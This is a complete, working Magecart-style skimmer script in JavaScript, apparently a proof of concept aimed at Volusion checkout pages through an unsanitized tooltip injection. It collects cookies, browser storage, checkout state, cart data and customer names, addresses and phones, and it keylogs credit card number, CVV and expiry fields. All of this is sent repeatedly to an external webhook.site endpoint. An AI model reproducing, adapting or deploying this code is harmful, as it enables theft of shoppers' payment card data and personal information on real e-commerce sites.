/**
 * Magecart-Style Skimmer for Volusion Checkout
 *
 * Hosted on GitHub Pages:
 *   https://telojos11.github.io/cekcek/payload.js
 *
 * Triggered via unsanitized dangerouslySetInnerHTML in the
 * react-tooltip x6() component inside vic.js.
 */
(function () {
  'use strict';

  // ============================================================
  // CONFIGURATION
  // ============================================================
  var CONFIG = {
    // Your exfiltration endpoint (Burp Collaborator / webhook.site / pipedream)
    exfilEndpoint: 'https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be',

    // Enable debug logging in console
    debug: true,

    // Keylogging for credit card fields
    keylogging: true,

    // Auto-exfiltrate interval in milliseconds
    exfilInterval: 5000,
  };

  // ============================================================
  // UTILITIES
  // ============================================================
  var log = function () {
    if (CONFIG.debug) {
      var args = ['[Skimmer]'].concat(Array.prototype.slice.call(arguments));
      console.log.apply(console, args);
    }
  };

  var beacon = function (data) {
    var payload = JSON.stringify(data);

    // 1. navigator.sendBeacon (works on page unload)
    if (navigator.sendBeacon) {
      try {
        navigator.sendBeacon(CONFIG.exfilEndpoint, payload);
      } catch (e) {}
    }

    // 2. fetch with keepalive
    try {
      fetch(CONFIG.exfilEndpoint, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        keepalive: true,
      }).catch(function () {});
    } catch (e) {}

    // 3. Image beacon fallback (most reliable)
    try {
      new Image().src =
        CONFIG.exfilEndpoint +
        '?d=' +
        encodeURIComponent(payload.slice(0, 1500));
    } catch (e) {}
  };

  // ============================================================
  // DATA COLLECTION
  // ============================================================
  var harvest = {};

  // 1. COOKIES
  harvest.cookies = document.cookie;

  // 2. LOCALSTORAGE (full dump)
  try {
    harvest.localStorage = {};
    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      harvest.localStorage[key] = localStorage.getItem(key);
    }
  } catch (e) {
    harvest.localStorage = 'access_denied';
  }

  // 3. SESSIONSTORAGE (full dump)
  try {
    harvest.sessionStorage = {};
    for (var j = 0; j < sessionStorage.length; j++) {
      var skey = sessionStorage.key(j);
      harvest.sessionStorage[skey] = sessionStorage.getItem(skey);
    }
  } catch (e) {
    harvest.sessionStorage = 'access_denied';
  }

  // 4. VOLUSION CHECKOUT STATE (MobX-persisted store)
  try {
    var storageKeys = Object.keys(localStorage);
    for (var k = 0; k < storageKeys.length; k++) {
      if (
        storageKeys[k].indexOf('persist') !== -1 ||
        storageKeys[k].indexOf('volusion') !== -1 ||
        storageKeys[k].indexOf('checkout') !== -1 ||
        storageKeys[k].indexOf('root') !== -1
      ) {
        harvest.persistedStateKey = storageKeys[k];
        harvest.persistedState = localStorage.getItem(storageKeys[k]);
        break;
      }
    }
  } catch (e) {}

  // 5. PAGE CONTEXT
  harvest.pageUrl = window.location.href;
  harvest.pageTitle = document.title;
  harvest.referrer = document.referrer;
  harvest.timestamp = new Date().toISOString();
  harvest.userAgent = navigator.userAgent;

  // 6. CART DATA from DOM
  try {
    harvest.cartItems = [];
    var cartEls = document.querySelectorAll('[data-testid="cartitem-content"]');
    for (var c = 0; c < cartEls.length; c++) {
      var el = cartEls[c];
      harvest.cartItems.push({
        name: (el.querySelector('.text-lg') || {}).textContent || '',
        options: (el.querySelector('.text-sm') || {}).textContent || '',
        price: '',
      });
    }
    // Also grab any element containing price info
    var priceEls = document.querySelectorAll('[data-testid*="price"]');
    for (var p = 0; p < priceEls.length && p < harvest.cartItems.length; p++) {
      harvest.cartItems[p].price =
        (priceEls[p] || {}).textContent || '';
    }
  } catch (e) {}

  // 7. CUSTOMER PII from form fields
  try {
    harvest.customerInfo = {};

    var emailEl = document.querySelector('input[type="email"]');
    if (emailEl) harvest.customerInfo.email = emailEl.value;

    var inputs = document.querySelectorAll('input');
    for (var n = 0; n < inputs.length; n++) {
      var inp = inputs[n];
      var nm = (inp.name || '').toLowerCase();
      var id = (inp.id || '').toLowerCase();
      if (nm.indexOf('firstname') !== -1 || nm.indexOf('first_name') !== -1)
        harvest.customerInfo.firstName = inp.value;
      if (nm.indexOf('lastname') !== -1 || nm.indexOf('last_name') !== -1)
        harvest.customerInfo.lastName = inp.value;
      if (nm.indexOf('phone') !== -1 || nm.indexOf('tel') !== -1)
        harvest.customerInfo.phone = inp.value;
      if (
        nm.indexOf('address') !== -1 ||
        nm.indexOf('street') !== -1 ||
        nm.indexOf('line1') !== -1
      )
        harvest.customerInfo.address = inp.value;
      if (nm.indexOf('city') !== -1) harvest.customerInfo.city = inp.value;
      if (nm.indexOf('state') !== -1 || nm.indexOf('region') !== -1)
        harvest.customerInfo.state = inp.value;
      if (nm.indexOf('zip') !== -1 || nm.indexOf('postal') !== -1)
        harvest.customerInfo.zip = inp.value;
      if (nm.indexOf('country') !== -1) harvest.customerInfo.country = inp.value;
    }
  } catch (e) {}

  // 8. PAYMENT METHOD INFO (non-sensitive metadata)
  try {
    harvest.paymentInfo = {};
    var paymentSection =
      document.querySelector('[data-testid*="payment"]') ||
      document.querySelector('[data-testid*="Payment"]');
    if (paymentSection) {
      harvest.paymentInfo.method =
        (paymentSection.querySelector('[data-testid*="method"]') || {}).textContent || '';
      harvest.paymentInfo.cardType =
        (paymentSection.querySelector('[data-testid*="card"]') || {}).textContent || '';
    }
  } catch (e) {}

  // ============================================================
  // KEYLOGGER — Capture keystrokes on credit card fields
  // ============================================================
  if (CONFIG.keylogging) {
    harvest.keystrokes = [];
    document.addEventListener(
      'input',
      function (e) {
        var target = e.target;
        if (target.tagName !== 'INPUT') return;
        var nameAttr = (target.name || '').toLowerCase();
        var idAttr = (target.id || '').toLowerCase();
        if (
          nameAttr.indexOf('card') !== -1 ||
          nameAttr.indexOf('number') !== -1 ||
          nameAttr.indexOf('cvv') !== -1 ||
          nameAttr.indexOf('cvc') !== -1 ||
          nameAttr.indexOf('exp') !== -1 ||
          nameAttr.indexOf('spreedly') !== -1 ||
          idAttr.indexOf('spreedly-card') !== -1 ||
          idAttr.indexOf('spreedly-cvv') !== -1 ||
          idAttr.indexOf('card-number') !== -1 ||
          idAttr.indexOf('credit-card') !== -1
        ) {
          harvest.keystrokes.push({
            field: target.name || target.id,
            value: target.value,
            time: Date.now(),
          });
        }
      },
      true
    );
  }

  // ============================================================
  // FORM SUBMISSION HOOK
  // ============================================================
  document.addEventListener(
    'submit',
    function (e) {
      var form = e.target;
      var formData = {};
      try {
        var fd = new FormData(form);
        fd.forEach(function (v, k) {
          // Exclude full card numbers for PCI, just flag that form was submitted
          if (
            k.toLowerCase().indexOf('card') === -1 &&
            k.toLowerCase().indexOf('cvv') === -1 &&
            k.toLowerCase().indexOf('cvc') === -1
          ) {
            formData[k] = v;
          } else {
            formData[k] = '***REDACTED***';
          }
        });
      } catch (err) {}
      harvest.formSubmission = {
        action: form.action,
        method: form.method,
        data: formData,
        time: Date.now(),
      };
      beacon(harvest);
    },
    true
  );

  // ============================================================
  // INITIAL EXFILTRATION
  // ============================================================
  log('Skimmer activated on:', harvest.pageUrl);
  log('Cookies captured:', harvest.cookies ? harvest.cookies.length : 0, 'bytes');
  log('localStorage keys:', Object.keys(harvest.localStorage || {}).length);
  beacon(harvest);

  // ============================================================
  // PERIODIC EXFILTRATION
  // ============================================================
  setInterval(function () {
    if (harvest.keystrokes && harvest.keystrokes.length > 0) {
      log('Exfiltrating', harvest.keystrokes.length, 'keystrokes...');
      beacon(harvest);
      harvest.keystrokes = [];
    }
  }, CONFIG.exfilInterval);

  log('Skimmer initialized — waiting for data...');
})();
